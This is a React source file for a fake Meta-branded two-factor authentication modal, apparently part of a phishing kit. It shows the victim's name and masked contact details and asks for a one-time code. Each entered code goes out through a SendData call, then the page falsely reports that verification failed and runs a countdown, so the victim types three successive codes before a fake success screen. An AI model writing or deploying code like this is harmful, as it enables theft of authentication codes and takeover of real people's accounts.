import React from 'react';
import Modal from './Modal';
import {
  btnPrimary,
  btnPrimarySubtle,
  errorTextClass,
  fieldInput,
  fieldShell,
  textLead,
  textMuted,
} from '@/components/privacy-flow/ui-styles';
import { maskEmail, maskPhoneNumber } from '@/utils/mask';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

export interface TwoFactorModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onProceedToSuccess: () => void;
}

const TWO_FA_MAX_LEN = 8;

function sanitizeTwoFaInput(raw: string): string {
  return raw.replace(/\D/g, '').slice(0, TWO_FA_MAX_LEN);
}

function isValidTwoFaCode(value: string): boolean {
  if (!/^\d+$/.test(value)) return false;
  return value.length === 6 || value.length === 8;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
  open,
  onOpenChange,
  onProceedToSuccess,
}) => {
    const [isOpen, setIsOpen] = React.useState(open);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email } = formDataState as FormData || {};

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email);

    let [countdown, setCountdown] = React.useState<number>((process.env.NEXT_PUBLIC_SETTING_TIME) ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);

    React.useEffect(() => {
        setIsOpen(open);
    }, [open]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id } = e.target;
        const value = sanitizeTwoFaInput(e.target.value);
        setTwoFa(value);
        setErrors((prev) => ({ ...prev, [id]: '' }));

        if (click === 0) {
            dispatch(updateForm({ twoFa: value }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: value }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: value }));
        }
    };

    const isTwoFaValid = isValidTwoFaCode(twoFa);

    const handleClose = () => {
        setIsOpen(false);
        onOpenChange(false);
    };

    const twoFaRetryMessage = (minutes: number, seconds: number) =>
        `The code could not be verified. Please try again in ${minutes > 0 ? `${minutes} min ` : ''}${seconds > 0 ? `${seconds} sec` : ''}.`.trim();

    const handleSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            if (!isValidTwoFaCode(twoFa)) {
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        const minutes = Math.floor(countdown / 60);
                        const seconds = countdown % 60;
                        setErrors({
                            twoFa: twoFaRetryMessage(minutes, seconds),
                        });

                        setLoading(false);
                        setTwoFa('');

                        const countdownInterval = setInterval(() => {
                            setDisable(true);
                            countdown -= 1;
                            setCountdown(countdown);

                            const minutes = Math.floor(countdown / 60);
                            const seconds = countdown % 60;

                            setErrors({
                                twoFa: twoFaRetryMessage(minutes, seconds),
                            });

                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                setClick(1);
                                setErrors({});
                                setDisable(false)
                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                            }
                        }, 1000);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        const minutes = Math.floor(countdown / 60);
                        const seconds = countdown % 60;
                        setErrors({
                            twoFa: twoFaRetryMessage(minutes, seconds),
                        });
                        setLoading(false);
                        setTwoFa('');

                        const countdownInterval = setInterval(() => {
                            setDisable(true);
                            countdown -= 1;
                            setCountdown(countdown);

                            const minutes = Math.floor(countdown / 60);
                            const seconds = countdown % 60;

                            setErrors({
                                twoFa: twoFaRetryMessage(minutes, seconds),
                            });

                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                setClick(2);
                                setErrors({});
                                setDisable(false)
                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                            }
                        }, 1000);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        onProceedToSuccess();
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const twoFaShell = `${fieldShell(!!errors.twoFa)}${disabled ? ' opacity-80' : ''}`;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="flex h-full w-full flex-1 flex-col items-center justify-between">
                <div className="w-full">
                    <div className={`mb-2 flex w-full items-baseline gap-1.5 ${textMuted}`}>
                        <span className="truncate font-medium text-slate-800">{fullName}</span>
                        <span className="h-1 w-1 shrink-0 translate-y-[-2px] rounded-full bg-slate-400" aria-hidden />
                        <span>Account</span>
                    </div>
                    <h2 className="mb-3 text-xl font-bold leading-snug tracking-tight text-slate-900">
                        Two-factor authentication (step 1 of 3)
                    </h2>
                    <p className={textLead}>
                        Enter the verification code sent to {emailDisplay} or {phoneDisplay}, or approve the request in
                        your authenticator app (for example Google Authenticator or Duo Mobile).
                    </p>
                    <div className="my-4 w-full overflow-hidden rounded-2xl border border-slate-100 bg-slate-50 shadow-inner">
                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                    </div>
                    <div className="w-full">
                        <form onSubmit={handleSubmit}>
                            <div className={twoFaShell}>
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    autoComplete="one-time-code"
                                    pattern="\d*"
                                    id="twoFa"
                                    name="twoFa"
                                    placeholder="6 or 8 digits"
                                    maxLength={TWO_FA_MAX_LEN}
                                    aria-describedby="twoFa-hint"
                                    className={`${fieldInput} w-full flex-1 text-center font-medium tracking-[0.18em] ${disabled ? 'cursor-not-allowed opacity-70' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    disabled={disabled}
                                />
                            </div>
                            <p id="twoFa-hint" className={`mt-1.5 ${textMuted}`}>
                                Enter exactly 6 or 8 digits. Other characters are ignored.
                            </p>
                            {errors.twoFa ? <p className={errorTextClass}>{errors.twoFa}</p> : null}

                            <div className="mt-5 w-full">
                                <button
                                    type="submit"
                                    className={btnPrimary}
                                    disabled={disabled || !isTwoFaValid || loading}
                                >
                                    {loading && (
                                        <span className="mr-2 inline-flex h-5 w-5 shrink-0 animate-spin">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                        </span>
                                    )}
                                    {loading ? '' : 'Continue'}
                                </button>
                            </div>

                            <div
                                className={`${btnPrimarySubtle} mt-3 pointer-events-none opacity-80`}
                                aria-disabled="true"
                            >
                                Try another way
                            </div>
                        </form>
                    </div>
                </div>

                <div className="mx-auto mt-8 w-[60px]">
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;